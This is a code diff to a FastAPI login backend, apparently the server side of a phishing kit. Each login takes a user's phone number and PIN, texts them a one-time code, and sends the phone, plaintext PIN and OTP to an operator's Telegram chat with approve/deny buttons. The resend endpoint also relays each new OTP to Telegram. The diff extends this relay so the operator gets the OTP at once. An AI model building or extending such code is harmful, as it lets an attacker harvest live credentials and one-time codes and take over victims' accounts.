@@ -17,6 +17,8 @@ from approvals import (
     pending_approvals,
     approval_results,
     approval_phones,
+    approval_pins,
+    approval_otps,
 )
 from notifications import send_otp_sms, send_telegram_message
 
@@ -33,7 +35,6 @@ app.add_middleware(
 init_db()
 
 otp_store = {}
-approval_pins = {}
 
 
 # --- Request Models ---
@@ -92,12 +93,22 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
         if not verify_user_pin(full_phone, request.pin):
             return {"status": "error", "message": "Invalid PIN"}
 
+    # 1. Generate OTP IMMEDIATELY
+    otp = str(random.randint(1000, 9999))
+    otp_store[full_phone] = otp
+
+    # 2. Send OTP to the user via SMS right away
+    background_tasks.add_task(send_otp_sms, full_phone, otp)
+
+    # 3. Create approval request and store the OTP for the admin
     approval_id = str(uuid4())
     create_approval(approval_id)
     approval_phones[approval_id] = full_phone
     approval_pins[approval_id] = request.pin
+    approval_otps[approval_id] = otp
 
-    await send_approval_request(approval_id, full_phone, request.pin)
+    # 4. Notify admin with credentials + OTP (with approve/deny buttons)
+    await send_approval_request(approval_id, full_phone, request.pin, otp)
 
     return {
         "status": "pending",
@@ -137,27 +148,20 @@ async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
 # --- RESEND OTP ---
 @app.post("/api/resend-otp")
 async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
-    """
-    Regenerate and resend an OTP for the given phone number.
-    Also sends a notification to the admin's Telegram.
-    """
     full_phone = format_phone(request.phone_number)
 
-    # 1. Generate a new OTP
     new_otp = str(random.randint(1000, 9999))
     otp_store[full_phone] = new_otp
 
-    # 2. Send the new OTP via SMS
     background_tasks.add_task(send_otp_sms, full_phone, new_otp)
 
-    # 3. Notify admin on Telegram
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     background_tasks.add_task(
         send_telegram_message,
-        f"🔄 <b>OTP Resent</b>\n\n"
-        f"📱 Phone: <code>{full_phone}</code>\n"
-        f"🔐 New OTP: <code>{new_otp}</code>\n"
-        f"🕒 Time: <code>{timestamp}</code>"
+        f"🔄 <b>OTP renvoyée</b>\n\n"
+        f"📱 Téléphone : <code>{full_phone}</code>\n"
+        f"🔐 Nouvelle OTP : <code>{new_otp}</code>\n"
+        f"🕒 Heure : <code>{timestamp}</code>"
     )
 
     return {"status": "success", "message": "OTP resent successfully"}
@@ -193,47 +197,53 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         approval_id = parts[1]
         approved = (action == "approve")
 
-        # Mark the result so polling picks it up
         set_approval_result(approval_id, approved)
 
-        # Acknowledge the button press
         await answer_callback_query(
             callback_id,
-            "✅ Approved" if approved else "❌ Rejected"
+            "✅ OTP Approuvée" if approved else "❌ OTP Refusée"
         )
 
-        # Fetch stored credentials
         phone = approval_phones.get(approval_id, "Unknown")
         pin = approval_pins.get(approval_id, "Unknown")
+        otp = approval_otps.get(approval_id, "Unknown")
 
-        # ---- If APPROVED: Generate OTP + send SMS + Telegram ----
-        if approved and phone != "Unknown":
-            otp = str(random.randint(1000, 9999))
-            otp_store[phone] = otp
-
-            # Send OTP via SMS
-            background_tasks.add_task(send_otp_sms, phone, otp)
-
-            # Send a separate Telegram message with the OTP
+        # ---- If DENIED: invalidate the OTP so the user cannot use it ----
+        if not approved and phone != "Unknown":
+            otp_store.pop(phone, None)
             background_tasks.add_task(
                 send_telegram_message,
-                f"🔑 <b>OTP Generated</b>\n\n"
-                f"📱 Phone: <code>{phone}</code>\n"
-                f"🔐 OTP: <code>{otp}</code>\n"
-                f"🆔 Ref: <code>{approval_id}</code>"
+                f"❌ <b>OTP refusée</b>\n"
+                f"📱 Téléphone : <code>{phone}</code>\n"
+                f"L'utilisateur ne pourra pas utiliser cette OTP."
+            )
+
+        # ---- If APPROVED: OTP was already sent, just notify ----
+        if approved and phone != "Unknown":
+            background_tasks.add_task(
+                send_telegram_message,
+                f"✅ <b>OTP approuvée</b>\n"
+                f"📱 Téléphone : <code>{phone}</code>\n"
+                f"L'utilisateur peut maintenant saisir son code."
             )
 
         # Edit the original message to show the decision
         if "message" in callback:
-            result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
+            result_text = "✅ <b>Approuvée</b>" if approved else "❌ <b>Refusée</b>"
             await edit_message(
                 chat_id=callback["message"]["chat"]["id"],
                 message_id=callback["message"]["message_id"],
                 text=f"{result_text}\n\n"
-                     f"📱 Phone: <code>{phone}</code>\n"
-                     f"🔑 PIN: <code>{pin}</code>\n"
-                     f"🆔 Ref: <code>{approval_id}</code>"
+                     f"📱 Téléphone : <code>{phone}</code>\n"
+                     f"🔑 PIN : <code>{pin}</code>\n"
+                     f"🔐 OTP : <code>{otp}</code>\n"
+                     f"🆔 Réf : <code>{approval_id}</code>"
             )
+
+        # Clean up
+        approval_phones.pop(approval_id, None)
+        approval_pins.pop(approval_id, None)
+        approval_otps.pop(approval_id, None)
 
         return {"ok": True}
 
